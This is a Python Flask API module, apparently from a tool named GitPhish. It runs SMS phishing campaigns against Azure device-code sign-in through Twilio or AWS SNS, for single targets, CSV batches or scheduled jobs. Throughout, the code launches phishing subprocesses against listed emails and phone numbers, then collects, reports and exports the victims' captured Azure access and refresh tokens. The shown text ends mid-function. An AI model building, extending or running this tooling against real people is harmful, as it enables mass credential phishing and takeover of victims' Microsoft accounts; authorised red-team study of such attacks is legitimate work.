"""
Azure Campaigns API for GitPhish Admin Interface.
Provides REST endpoints for managing AWS SNS and Twilio Azure SMS campaigns.
"""

import json
import subprocess
import tempfile
import os
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List
from flask import request, jsonify
import boto3
from twilio.rest import Client
from botocore.exceptions import BotoCoreError, ClientError
from gitphish.core.scheduler import JobScheduler, JobStatus, JobType

logger = logging.getLogger(__name__)

class AzureCampaignsAPI:
    """API handler for Azure campaigns functionality."""
    
    def __init__(self, app, github_account_service, compromised_account_service, scheduler=None):
        self.app = app
        self.github_account_service = github_account_service
        self.compromised_account_service = compromised_account_service
        self.active_campaigns = {}  # In-memory storage for demo - use DB in production
        self.scheduler = scheduler or JobScheduler()
        self._setup_routes()

    def _setup_routes(self):
        """Setup API routes."""
        
        @self.app.route('/api/azure-campaigns/start', methods=['POST'])
        def start_azure_campaign():
            """Start a new Azure campaign."""
            try:
                data = request.get_json()
                
                # Validate required fields
                required_fields = ['platform', 'provider', 'name']
                for field in required_fields:
                    if not data.get(field):
                        return jsonify({'success': False, 'error': f'{field} is required'}), 400
                
                platform = data['platform']  # Should be 'azure'
                provider = data['provider']  # 'twilio' or 'aws'
                
                # Handle CSV file uploads
                if data.get('targetMethod') == 'file':
                    return self._start_csv_campaign(data, platform, provider)
                
                # Debug: Log the received data
                logger.info(f"Building campaign command with data: {data}")
                
                # Build command based on platform and provider
                cmd_args = self._build_campaign_command(data)
                if not cmd_args:
                    return jsonify({'success': False, 'error': 'Invalid campaign configuration'}), 400
                
                # Debug: Log the built command
                logger.info(f"Built command: {' '.join(cmd_args)}")
                
                # Generate campaign ID
                campaign_id = f"{platform}_{provider}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
                
                # Store campaign info
                self.active_campaigns[campaign_id] = {
                    'id': campaign_id,
                    'platform': platform,
                    'provider': provider,
                    'name': data['name'],
                    'status': 'starting',
                    'started': datetime.now().isoformat(),
                    'target_count': self._count_targets(data),
                    'command': cmd_args
                }
                
                # Start the campaign subprocess
                try:
                    # Get current environment and add AWS credentials if needed
                    env = os.environ.copy()
                    if data.get('provider') == 'aws':
                        if data.get('awsAccessKeyId'):
                            env['AWS_ACCESS_KEY_ID'] = data['awsAccessKeyId']
                        if data.get('awsSecretAccessKey'):
                            env['AWS_SECRET_ACCESS_KEY'] = data['awsSecretAccessKey']
                        if data.get('awsSessionToken') and data['awsSessionToken'].strip():
                            env['AWS_SESSION_TOKEN'] = data['awsSessionToken']
                        if data.get('awsRegion'):
                            env['AWS_DEFAULT_REGION'] = data['awsRegion']
                    
                    # Get the correct working directory (where the python module is)
                    current_file = os.path.abspath(__file__)
                    # Navigate from api file to root
                    root_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(current_file)))))
                    
                    process = subprocess.Popen(
                        cmd_args, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        env=env,
                        cwd=root_dir
                    )
                    self.active_campaigns[campaign_id]['process'] = process
                    self.active_campaigns[campaign_id]['status'] = 'running'
                    
                    logger.info(f"Started Azure campaign {campaign_id} with command: {' '.join(cmd_args)}")
                    if data.get('provider') == 'aws':
                        logger.info(f"AWS credentials set for campaign {campaign_id}")
                    
                    # Log initial output for debugging
                    try:
                        stdout_data, stderr_data = process.communicate(timeout=5)
                        if stdout_data:
                            logger.info(f"Campaign {campaign_id} stdout: {stdout_data.decode()}")
                        if stderr_data:
                            logger.error(f"Campaign {campaign_id} stderr: {stderr_data.decode()}")
                    except subprocess.TimeoutExpired:
                        logger.info(f"Campaign {campaign_id} still running after 5 seconds")
                    except Exception as comm_e:
                        logger.error(f"Error getting campaign output: {str(comm_e)}")
                    
                except Exception as e:
                    logger.error(f"Failed to start campaign process: {str(e)}")
                    self.active_campaigns[campaign_id]['status'] = 'failed'
                    self.active_campaigns[campaign_id]['error'] = str(e)
                
                return jsonify({
                    'success': True, 
                    'campaign_id': campaign_id,
                    'message': 'Campaign started successfully'
                })
                
            except Exception as e:
                logger.error(f"Error starting campaign: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/azure-campaigns/list', methods=['GET'])
        def list_azure_campaigns():
            """List all campaigns (both active and scheduled)."""
            try:
                # Update campaign statuses
                for campaign_id, campaign in self.active_campaigns.items():
                    # Check if campaign has captured tokens
                    tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
                    if tokens and campaign['status'] in ['running', 'completed']:
                        campaign['status'] = 'token received'
                        campaign['tokens_captured'] = len(tokens)
                    
                    # Check for expired campaigns (Azure device codes expire after 15 minutes typically)
                    if campaign['status'] == 'running' and self._is_campaign_expired(campaign):
                        campaign['status'] = 'expired'
                        campaign['finished'] = datetime.now().isoformat()
                    
                    # Check process status for running campaigns
                    if campaign.get('batch_mode'):
                        # Handle batch campaigns with multiple processes
                        self._update_batch_campaign_status(campaign)
                    elif 'process' in campaign and campaign['status'] == 'running':
                        process = campaign['process']
                        if process.poll() is not None:  # Process has finished
                            if tokens:
                                campaign['status'] = 'token received'
                                campaign['tokens_captured'] = len(tokens)
                            else:
                                campaign['status'] = 'completed' if process.returncode == 0 else 'failed'
                            campaign['finished'] = datetime.now().isoformat()
                
                # Create JSON-serializable copy without process objects for active campaigns
                campaigns_json = []
                for campaign in self.active_campaigns.values():
                    campaign_copy = campaign.copy()
                    # Remove non-serializable objects
                    campaign_copy.pop('process', None)
                    
                    # For batch campaigns, remove processes array and add summary info
                    if campaign_copy.get('batch_mode'):
                        campaign_copy.pop('processes', None)
                        campaign_copy.pop('targets', None)  # Remove detailed target info to reduce payload
                        # Keep the status and count info which was updated by _update_batch_campaign_status
                    
                    campaigns_json.append(campaign_copy)
                
                # Add scheduled campaigns to the main list
                scheduled_jobs = self.scheduler.get_scheduled_jobs()
                azure_jobs = [job for job in scheduled_jobs if job['job_type'] == 'azure_campaign']
                
                for job in azure_jobs:
                    # Convert scheduled job to campaign format
                    campaign_from_job = {
                        'id': f"scheduled_{job['id']}",
                        'platform': job['job_data'].get('platform', 'azure'),
                        'provider': job['job_data'].get('provider', 'unknown'),
                        'name': job['job_name'],
                        'status': job['status'],
                        'started': job.get('executed_at') or job.get('scheduled_time'),
                        'target_count': 1,  # Scheduled jobs are typically single target
                        'scheduled': True,
                        'scheduled_time': job['scheduled_time'],
                        'job_id': job['id'],
                        'created_at': job.get('created_at'),
                        'campaign_id': job.get('campaign_id')
                    }
                    
                    # For completed scheduled campaigns, check for captured tokens
                    if job['status'] == 'completed' and job.get('campaign_id'):
                        tokens = self._find_campaign_tokens(job['campaign_id'], job['job_name'])
                        if tokens:
                            campaign_from_job['status'] = 'token received'
                            campaign_from_job['tokens_captured'] = len(tokens)
                    
                    campaigns_json.append(campaign_from_job)
                
                # Sort campaigns by start time (most recent first)
                campaigns_json.sort(key=lambda x: x.get('started', ''), reverse=True)
                
                return jsonify({'success': True, 'campaigns': campaigns_json})
                
            except Exception as e:
                logger.error(f"Error listing campaigns: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/azure-campaigns/stop/<campaign_id>', methods=['POST'])
        def stop_azure_campaign(campaign_id):
            """Stop a running campaign."""
            try:
                if campaign_id not in self.active_campaigns:
                    return jsonify({'success': False, 'error': 'Campaign not found'}), 404
                
                campaign = self.active_campaigns[campaign_id]
                
                if 'process' in campaign and campaign['status'] == 'running':
                    process = campaign['process']
                    process.terminate()
                    campaign['status'] = 'stopped'
                    campaign['finished'] = datetime.now().isoformat()
                    
                    logger.info(f"Stopped Azure campaign {campaign_id}")
                
                return jsonify({'success': True, 'message': 'Campaign stopped successfully'})
                
            except Exception as e:
                logger.error(f"Error stopping campaign: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/azure-campaigns/test-twilio', methods=['POST'])
        def test_azure_twilio():
            """Test Twilio configuration."""
            try:
                data = request.get_json()
                sid = data.get('sid')
                token = data.get('token')
                
                if not sid or not token:
                    return jsonify({'success': False, 'error': 'SID and token are required'}), 400
                
                # Test Twilio connection
                client = Client(sid, token)
                account = client.api.accounts(sid).fetch()
                
                return jsonify({
                    'success': True, 
                    'message': f'Twilio connection successful. Account: {account.friendly_name}'
                })
                
            except Exception as e:
                logger.error(f"Error testing Twilio: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/azure-campaigns/test-aws', methods=['POST'])
        def test_azure_aws():
            """Test AWS SNS configuration."""
            try:
                data = request.get_json()
                access_key_id = data.get('accessKeyId')
                secret_access_key = data.get('secretAccessKey')
                session_token = data.get('sessionToken')
                region = data.get('region', 'us-east-2')
                
                if not access_key_id or not secret_access_key:
                    return jsonify({'success': False, 'error': 'Access Key ID and Secret Access Key are required'}), 400
                
                # Build client configuration
                client_config = {
                    'aws_access_key_id': access_key_id,
                    'aws_secret_access_key': secret_access_key,
                    'region_name': region
                }
                
                # Add session token if provided
                if session_token and session_token.strip():
                    client_config['aws_session_token'] = session_token
                
                # Test AWS SNS connection with provided credentials
                sns_client = boto3.client('sns', **client_config)
                response = sns_client.list_topics()
                
                return jsonify({
                    'success': True, 
                    'message': f'AWS SNS connection successful. Region: {region}'
                })
                
            except (BotoCoreError, ClientError) as e:
                logger.error(f"Error testing AWS: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500
            except Exception as e:
                logger.error(f"Error testing AWS: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/azure-campaigns/logs/<campaign_id>', methods=['GET'])
        def get_azure_campaign_logs(campaign_id):
            """Get live logs for a campaign."""
            try:
                if campaign_id not in self.active_campaigns:
                    return jsonify({'success': False, 'error': 'Campaign not found'}), 404
                
                campaign = self.active_campaigns[campaign_id]
                
                # Get output from subprocess(es)
                output = ""
                
                if campaign.get('batch_mode'):
                    # For batch campaigns, aggregate output from all processes
                    output = self._get_batch_campaign_output(campaign)
                elif 'process' in campaign:
                    process = campaign['process']
                    if process.poll() is None:  # Still running
                        # Try to read available output without blocking
                        try:
                            stdout_data = process.stdout.read()
                            stderr_data = process.stderr.read()
                            if stdout_data:
                                output += stdout_data.decode()
                            if stderr_data:
                                output += "\n--- STDERR ---\n" + stderr_data.decode()
                        except:
                            pass
                    else:
                        # Process finished, get all output
                        stdout_data, stderr_data = process.communicate()
                        if stdout_data:
                            output += stdout_data.decode()
                        if stderr_data:
                            stderr_text = stderr_data.decode()
                            # Only show stderr if it doesn't contain help/usage text (indicates actual errors)
                            if not ('usage:' in stderr_text or 'the following arguments are required' in stderr_text):
                                output += "\n--- STDERR ---\n" + stderr_text
                
                if not output:
                    output = "No output yet..."
                
                # Check for token files and parse them
                if campaign.get('batch_mode'):
                    # For batch campaigns, only show tokens from targets in this batch
                    tokens = self._find_batch_campaign_tokens(campaign)
                    sms_sent = campaign.get('completed_targets', 0)
                else:
                    tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
                    sms_sent = 1 if 'Text message successfully sent' in output else 0
                
                # Calculate stats
                stats = {
                    'status': campaign.get('status', 'unknown'),
                    'sms_sent': sms_sent,
                    'tokens_captured': len(tokens),
                    'runtime': self._calculate_runtime(campaign.get('started'))
                }
                
                return jsonify({
                    'success': True,
                    'output': output,
                    'stats': stats,
                    'tokens': tokens
                })
                
            except Exception as e:
                logger.error(f"Error getting campaign logs: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/azure-campaigns/logs/<campaign_id>/download', methods=['GET'])
        def download_azure_campaign_logs(campaign_id):
            """Download campaign logs as text file."""
            try:
                if campaign_id not in self.active_campaigns:
                    return jsonify({'success': False, 'error': 'Campaign not found'}), 404
                
                campaign = self.active_campaigns[campaign_id]
                
                # Get full output
                output = f"Campaign ID: {campaign_id}\n"
                output += f"Campaign Name: {campaign.get('name', 'Unknown')}\n"
                output += f"Platform: {campaign.get('platform', 'Unknown')}\n"
                output += f"Provider: {campaign.get('provider', 'Unknown')}\n"
                output += f"Started: {campaign.get('started', 'Unknown')}\n"
                output += f"Status: {campaign.get('status', 'Unknown')}\n"
                output += "=" * 50 + "\n\n"
                
                # Get subprocess output
                if 'process' in campaign:
                    process = campaign['process']
                    try:
                        if process.poll() is None:
                            stdout_data = process.stdout.read()
                            stderr_data = process.stderr.read()
                        else:
                            stdout_data, stderr_data = process.communicate()
                        
                        if stdout_data:
                            output += "STDOUT:\n" + stdout_data.decode() + "\n\n"
                        if stderr_data:
                            output += "STDERR:\n" + stderr_data.decode() + "\n\n"
                    except:
                        output += "Error reading process output\n"
                
                # Return as downloadable file
                from flask import make_response
                response = make_response(output)
                response.headers['Content-Type'] = 'text/plain'
                response.headers['Content-Disposition'] = f'attachment; filename=azure-campaign-{campaign_id}-logs.txt'
                return response
                
            except Exception as e:
                logger.error(f"Error downloading campaign logs: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/azure-campaigns/tokens/<campaign_id>/download', methods=['GET'])
        def download_azure_campaign_tokens(campaign_id):
            """Download captured tokens as JSON."""
            try:
                if campaign_id not in self.active_campaigns:
                    return jsonify({'success': False, 'error': 'Campaign not found'}), 404
                
                campaign = self.active_campaigns[campaign_id]
                tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
                
                return jsonify({
                    'success': True,
                    'campaign_id': campaign_id,
                    'tokens': tokens,
                    'exported_at': datetime.now().isoformat()
                })
                
            except Exception as e:
                logger.error(f"Error downloading campaign tokens: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/azure-campaigns/logs/scheduled_tokens', methods=['POST'])
        def get_scheduled_campaign_tokens():
            """Get tokens for a scheduled campaign."""
            try:
                data = request.get_json()
                job_name = data.get('job_name', '')
                target_email = data.get('target_email', '')
                campaign_id = data.get('campaign_id', '')
                
                # For scheduled campaigns, find tokens based on target email
                tokens = self._find_scheduled_campaign_tokens(target_email, job_name, campaign_id)
                
                return jsonify({
                    'success': True,
                    'tokens': tokens,
                    'job_name': job_name,
                    'target_email': target_email
                })
                
            except Exception as e:
                logger.error(f"Error getting scheduled campaign tokens: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/azure-campaigns/schedule', methods=['POST'])
        def schedule_azure_campaign():
            """Schedule an Azure campaign for later execution."""
            try:
                data = request.get_json()
                
                # Validate required fields
                required_fields = ['platform', 'provider', 'name', 'scheduledTime']
                for field in required_fields:
                    if not data.get(field):
                        return jsonify({'success': False, 'error': f'{field} is required'}), 400
                
                # Handle CSV content if provided
                if data.get('targetMethod') == 'file' and data.get('csvContent'):
                    try:
                        targets = self._parse_csv_targets(data['csvContent'])
                        if not targets:
                            return jsonify({'success': False, 'error': 'No valid targets found in CSV'}), 400
                        
                        # Schedule individual jobs for each target
                        scheduled_jobs = []
                        for i, target in enumerate(targets):
                            # Create job data for individual target
                            job_data = data.copy()
                            job_data['targetEmail'] = target['email']
                            job_data['targetPhone'] = target['phone']
                            job_data['name'] = f"{data['name']} - Target {i+1}"
                            
                            # Remove CSV content from individual job data
                            job_data.pop('csvContent', None)
                            job_data.pop('targetMethod', None)
                            
                            # Parse scheduled time
                            try:
                                scheduled_time = datetime.fromisoformat(data['scheduledTime'].replace('Z', '+00:00'))
                                # Convert to naive datetime for consistent comparison
                                if scheduled_time.tzinfo is not None:
                                    scheduled_time = scheduled_time.replace(tzinfo=None)
                            except ValueError as e:
                                return jsonify({'success': False, 'error': f'Invalid scheduled time format: {str(e)}'}), 400
                            
                            # Check if scheduled time is in the future (compare in UTC)
                            from datetime import timezone
                            now_utc = datetime.now(timezone.utc).replace(tzinfo=None)
                            if scheduled_time <= now_utc:
                                return jsonify({'success': False, 'error': 'Scheduled time must be in the future'}), 400
                            
                            # Schedule individual job
                            job_id = self.scheduler.schedule_job(
                                JobType.AZURE_CAMPAIGN,
                                job_data['name'],
                                scheduled_time,
                                job_data
                            )
                            scheduled_jobs.append(job_id)
                        
                        logger.info(f"Scheduled {len(scheduled_jobs)} Azure campaign jobs for CSV batch '{data['name']}' at {scheduled_time}")
                        
                        return jsonify({
                            'success': True,
                            'job_ids': scheduled_jobs,
                            'target_count': len(targets),
                            'scheduled_time': scheduled_time.isoformat(),
                            'message': f'Scheduled {len(targets)} campaign jobs successfully'
                        })
                        
                    except Exception as e:
                        logger.error(f"Error processing CSV for scheduling: {str(e)}")
                        return jsonify({'success': False, 'error': f'CSV processing error: {str(e)}'}), 400
                
                # Handle single target scheduling (existing logic)
                if not data.get('targetEmail') or not data.get('targetPhone'):
                    return jsonify({'success': False, 'error': 'targetEmail and targetPhone are required for single target campaigns'}), 400
                
                # Parse scheduled time
                try:
                    scheduled_time = datetime.fromisoformat(data['scheduledTime'].replace('Z', '+00:00'))
                    # Convert to naive datetime for consistent comparison
                    if scheduled_time.tzinfo is not None:
                        scheduled_time = scheduled_time.replace(tzinfo=None)
                except ValueError as e:
                    return jsonify({'success': False, 'error': f'Invalid scheduled time format: {str(e)}'}), 400
                
                # Check if scheduled time is in the future (compare in UTC)
                from datetime import timezone
                now_utc = datetime.now(timezone.utc).replace(tzinfo=None)
                if scheduled_time <= now_utc:
                    return jsonify({'success': False, 'error': 'Scheduled time must be in the future'}), 400
                
                # Schedule the job
                job_id = self.scheduler.schedule_job(
                    JobType.AZURE_CAMPAIGN,
                    data['name'],
                    scheduled_time,
                    data
                )
                
                logger.info(f"Scheduled Azure campaign '{data['name']}' for {scheduled_time}")
                
                return jsonify({
                    'success': True,
                    'job_id': job_id,
                    'scheduled_time': scheduled_time.isoformat(),
                    'message': 'Campaign scheduled successfully'
                })
                
            except Exception as e:
                logger.error(f"Error scheduling Azure campaign: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/azure-campaigns/scheduled', methods=['GET'])
        def list_scheduled_azure_campaigns():
            """List all scheduled Azure campaigns."""
            try:
                # Get scheduled jobs from database
                jobs = self.scheduler.get_scheduled_jobs()
                
                # Filter for Azure campaigns only
                azure_jobs = [job for job in jobs if job['job_type'] == JobType.AZURE_CAMPAIGN.value]
                
                return jsonify({'success': True, 'scheduled_campaigns': azure_jobs})
                
            except Exception as e:
                logger.error(f"Error listing scheduled Azure campaigns: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/azure-campaigns/scheduled/<int:job_id>/cancel', methods=['POST'])
        def cancel_scheduled_azure_campaign(job_id):
            """Cancel a scheduled Azure campaign."""
            try:
                success = self.scheduler.cancel_job(job_id)
                
                if success:
                    return jsonify({'success': True, 'message': 'Scheduled campaign cancelled successfully'})
                else:
                    return jsonify({'success': False, 'error': 'Job not found or cannot be cancelled'}), 404
                    
            except Exception as e:
                logger.error(f"Error cancelling scheduled Azure campaign: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.app.route('/api/azure-campaigns/scheduled/<int:job_id>/status', methods=['GET'])
        def get_scheduled_azure_campaign_status(job_id):
            """Get status of a scheduled Azure campaign."""
            try:
                job = self.scheduler.get_job_status(job_id)
                
                if job:
                    return jsonify({'success': True, 'job': job})
                else:
                    return jsonify({'success': False, 'error': 'Job not found'}), 404
                    
            except Exception as e:
                logger.error(f"Error getting scheduled Azure campaign status: {str(e)}")
                return jsonify({'success': False, 'error': str(e)}), 500

    def _build_campaign_command(self, data: Dict[str, Any]) -> Optional[list]:
        """Build the command line arguments for the campaign."""
        try:
            platform = data['platform']
            provider = data['provider']
            
            # Base command - use python module
            cmd = ['python', '-m', 'gitphish', 'azure']
            
            # Determine the mode based on provider and platform
            if provider == 'twilio' and platform == 'azure':
                cmd.append('twilio-azure')
            elif provider == 'aws' and platform == 'azure':
                cmd.append('aws-azure')
            else:
                return None
            
            # Add target information
            if data.get('targetMethod') == 'single':
                if data.get('targetEmail'):
                    cmd.extend(['-e', data['targetEmail']])
                if data.get('targetPhone'):
                    cmd.extend(['-p', data['targetPhone']])
            else:
                # This should not be reached for file uploads as they are handled separately
                logger.error("File upload reached single target command builder - this should not happen")
                return None
            
            # Add provider-specific arguments
            if provider == 'twilio':
                if data.get('twilioSid'):
                    cmd.extend(['--sid', data['twilioSid']])
                if data.get('twilioToken'):
                    cmd.extend(['--token', data['twilioToken']])
                if data.get('fromPhone'):
                    cmd.extend(['--from-phone', data['fromPhone']])
            elif provider == 'aws':
                if data.get('awsRegion'):
                    cmd.extend(['--region', data['awsRegion']])
            
            # Add optional arguments
            if data.get('scope'):
                cmd.extend(['--scope', data['scope']])
            
            if data.get('debug'):
                cmd.append('--debug')
            
            if data.get('messageTemplate'):
                cmd.extend(['--message', data['messageTemplate']])
            
            return cmd
            
        except Exception as e:
            logger.error(f"Error building campaign command: {str(e)}")
            return None

    def _count_targets(self, data: Dict[str, Any]) -> int:
        """Count the number of targets in the campaign."""
        if data.get('targetMethod') == 'single':
            return 1 if data.get('targetEmail') else 0
        else:
            # For file uploads, we'd need to count lines in the file
            # For now, return placeholder
            return 0  # This would be implemented with proper file handling

    def _find_campaign_tokens(self, campaign_id: str, campaign_name: str) -> list:
        """Find and parse token files generated by the campaign."""
        import glob
        tokens = []
        
        try:
            # Look for token files in the current directory
            # Azure tokens: {email}.azure_token.json
            
            token_files = glob.glob('*.azure_token.json')
            
            for token_file in token_files:
                try:
                    with open(token_file, 'r') as f:
                        token_data = json.load(f)
                        
                    # Extract email from filename
                    email = token_file.replace('.azure_token.json', '')
                    
                    tokens.append({
                        'email': email,
                        'access_token': token_data.get('access_token', 'N/A'),
                        'refresh_token': token_data.get('refresh_token', 'N/A'),
                        'token_type': token_data.get('token_type', 'Bearer'),
                        'scope': token_data.get('scope', 'N/A'),
                        'expires_in': token_data.get('expires_in', 3600),
                        'file': token_file,
                        'captured_at': os.path.getmtime(token_file)
                    })
                except Exception as e:
                    logger.error(f"Error parsing token file {token_file}: {str(e)}")
                    
        except Exception as e:
            logger.error(f"Error finding token files: {str(e)}")
        
        return tokens

    def _find_scheduled_campaign_tokens(self, target_email: str, job_name: str, campaign_id: str) -> list:
        """Find and parse token files generated by scheduled campaigns."""
        import glob
        import os
        tokens = []
        
        try:
            # Look for token files that match the target email
            # Azure tokens: {email}.azure_token.json
            token_file = f"{target_email}.azure_token.json"
            
            if os.path.exists(token_file):
                try:
                    with open(token_file, 'r') as f:
                        token_data = json.load(f)
                    
                    tokens.append({
                        'email': target_email,
                        'access_token': token_data.get('access_token', 'N/A'),
                        'refresh_token': token_data.get('refresh_token', 'N/A'),
                        'token_type': token_data.get('token_type', 'Bearer'),
                        'scope': token_data.get('scope', 'N/A'),
                        'expires_in': token_data.get('expires_in', 3600),
                        'file': token_file,
                        'captured_at': os.path.getmtime(token_file)
                    })
                except Exception as e:
                    logger.error(f"Error parsing scheduled token file {token_file}: {str(e)}")
            
        except Exception as e:
            logger.error(f"Error finding scheduled campaign token files: {str(e)}")
        
        return tokens

    def _calculate_runtime(self, started_time: str) -> str:
        """Calculate how long the campaign has been running."""
        if not started_time:
            return 'Unknown'
        
        try:
            start_dt = datetime.fromisoformat(started_time.replace('Z', '+00:00'))
            now_dt = datetime.now(start_dt.tzinfo) if start_dt.tzinfo else datetime.now()
            
            delta = now_dt - start_dt
            
            if delta.days > 0:
                return f"{delta.days}d {delta.seconds // 3600}h"
            elif delta.seconds >= 3600:
                return f"{delta.seconds // 3600}h {(delta.seconds % 3600) // 60}m"
            elif delta.seconds >= 60:
                return f"{delta.seconds // 60}m {delta.seconds % 60}s"
            else:
                return f"{delta.seconds}s"
                
        except Exception as e:
            logger.error(f"Error calculating runtime: {str(e)}")
            return 'Error'

    def _is_campaign_expired(self, campaign: Dict[str, Any]) -> bool:
        """Check if a campaign has expired (Azure device codes expire after 15 minutes)."""
        if not campaign.get('started'):
            return False
        
        try:
            start_dt = datetime.fromisoformat(campaign['started'].replace('Z', '+00:00'))
            now_dt = datetime.now(start_dt.tzinfo) if start_dt.tzinfo else datetime.now()
            
            # Azure device codes typically expire after 15 minutes
            # Add a buffer for processing time
            expiry_duration = timedelta(minutes=16)
            
            return now_dt - start_dt > expiry_duration
            
        except Exception as e:
            logger.error(f"Error checking campaign expiry: {str(e)}")
            return False

    def _start_csv_campaign(self, data: Dict[str, Any], platform: str, provider: str) -> any:
        """Start a campaign with CSV target list."""
        try:
            # Get CSV data from the request
            csv_content = data.get('csvContent')
            if not csv_content:
                return jsonify({'success': False, 'error': 'CSV content is required for file uploads'}), 400
            
            # Parse CSV content
            targets = self._parse_csv_targets(csv_content)
            if not targets:
                return jsonify({'success': False, 'error': 'No valid targets found in CSV'}), 400
            
            logger.info(f"Parsed {len(targets)} targets from CSV")
            
            # Generate campaign ID for the batch
            campaign_id = f"{platform}_{provider}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_batch"
            
            # Store batch campaign info
            self.active_campaigns[campaign_id] = {
                'id': campaign_id,
                'platform': platform,
                'provider': provider,
                'name': data['name'],
                'status': 'starting',
                'started': datetime.now().isoformat(),
                'target_count': len(targets),
                'targets': targets,
                'batch_mode': True,
                'completed_targets': 0,
                'failed_targets': 0,
                'processes': []  # Store individual processes
            }
            
            # Start individual campaigns for each target
            for i, target in enumerate(targets):
                target_data = data.copy()
                target_data['targetMethod'] = 'single'
                target_data['targetEmail'] = target['email']
                target_data['targetPhone'] = target['phone']
                
                # Build command for this target
                cmd_args = self._build_campaign_command(target_data)
                if not cmd_args:
                    logger.error(f"Failed to build command for target {target['email']}")
                    continue
                
                # Set environment variables for AWS
                env = os.environ.copy()
                if provider == 'aws':
                    if target_data.get('awsAccessKeyId'):
                        env['AWS_ACCESS_KEY_ID'] = target_data['awsAccessKeyId']
                    if target_data.get('awsSecretAccessKey'):
                        env['AWS_SECRET_ACCESS_KEY'] = target_data['awsSecretAccessKey']
                    if target_data.get('awsSessionToken'):
                        env['AWS_SESSION_TOKEN'] = target_data['awsSessionToken']
                    if target_data.get('awsRegion'):
                        env['AWS_DEFAULT_REGION'] = target_data['awsRegion']
                
                # Get the correct working directory
                current_file = os.path.abspath(__file__)
                root_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(current_file)))))
                
                # Start process for this target
                process = subprocess.Popen(
                    cmd_args, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE,
                    env=env,
                    cwd=root_dir
                )
                
                # Store process info
                self.active_campaigns[campaign_id]['processes'].append({
                    'target': target,
                    'process': process,
                    'status': 'running'
                })
                
                logger.info(f"Started process for target {target['email']}: {' '.join(cmd_args)}")
            
            self.active_campaigns[campaign_id]['status'] = 'running'
            
            return jsonify({
                'success': True, 
                'message': f'Batch campaign started with {len(targets)} targets',
                'campaign_id': campaign_id,
                'target_count': len(targets)
            })
            
        except Exception as e:
            logger.error(f"Error starting CSV campaign: {str(e)}")
            return jsonify({'success': False, 'error': str(e)}), 500

    def _parse_csv_targets(self, csv_content: str) -> List[Dict[str, str]]:
        """Parse CSV content and return list of valid targets."""
        targets = []
        lines = csv_content.strip().split('\n')
        
        for line_num, line in enumerate(lines, 1):
            line = line.strip()
            if not line:  # Skip empty lines
                continue
                
            parts = line.split(',')
            if len(parts) != 2:
                logger.warning(f"CSV line {line_num}: Invalid format (expected 2 columns, got {len(parts)})")
                continue
            
            email = parts[0].strip()
            phone = parts[1].strip()
            
            # Basic validation
            if '@' not in email:
                logger.warning(f"CSV line {line_num}: Invalid email format: {email}")
                continue
            
            if not phone.startswith('+'):
                logger.warning(f"CSV line {line_num}: Phone should start with +: {phone}")
                continue
            
            targets.append({
                'email': email,
                'phone': phone,
                'line_number': line_num
            })
        
        return targets

    def _update_batch_campaign_status(self, campaign: Dict[str, Any]) -> None:
        """Update status of a batch campaign by checking all individual processes."""
        if not campaign.get('processes'):
            return
        
        completed_count = 0
        failed_count = 0
        running_count = 0
        total_tokens = 0
        
        for proc_info in campaign['processes']:
            process = proc_info['process']
            target = proc_info['target']
            
            if process.poll() is not None:  # Process finished
                if process.returncode == 0:
                    completed_count += 1
                    # Check for tokens for this target
                    tokens = self._find_scheduled_campaign_tokens(target['email'], campaign['name'], campaign['id'])
                    total_tokens += len(tokens)
                else:
                    failed_count += 1
                proc_info['status'] = 'completed' if process.returncode == 0 else 'failed'
            else:
                running_count += 1
                proc_info['status'] = 'running'
        
        # Update campaign status based on process states
        campaign['completed_targets'] = completed_count
        campaign['failed_targets'] = failed_count
        campaign['tokens_captured'] = total_tokens
        
        if running_count == 0:  # All processes finished
            if total_tokens > 0:
                campaign['status'] = 'token received'
            elif failed_count == 0:
                campaign['status'] = 'completed'
            elif completed_count > 0:
                campaign['status'] = 'partial success'
            else:
                campaign['status'] = 'failed'
            campaign['finished'] = datetime.now().isoformat()
        else:
            campaign['status'] = 'running'

    def _find_batch_campaign_tokens(self, campaign: Dict[str, Any]) -> list:
        """Find tokens that were captured by this specific batch campaign."""
        tokens = []
        
        try:
            # For batch campaigns, find all Azure tokens created after the campaign started
            # This is the best we can do without storing the target list
            campaign_start = datetime.fromisoformat(campaign['started'].replace('Z', '+00:00'))
            
            import glob
            token_files = glob.glob('*.azure_token.json')
            
            for token_file in token_files:
                try:
                    # Check if this token was created after the campaign started (with 1 minute buffer)
                    token_modified = datetime.fromtimestamp(os.path.getmtime(token_file))
                    
                    if token_modified >= campaign_start - timedelta(minutes=1):
                        with open(token_file, 'r') as f:
                            token_data = json.load(f)
                        
                        # Extract email from filename
                        email = token_file.replace('.azure_token.json', '')
                        
                        tokens.append({
                            'email': email,
                            'access_token': token_data.get('access_token', 'N/A'),
                            'refresh_token': token_data.get('refresh_token', 'N/A'),
                            'token_type': token_data.get('token_type', 'Bearer'),
                            'scope': token_data.get('scope', 'N/A'),
                            'expires_in': token_data.get('expires_in', 3600),
                            'file': token_file,
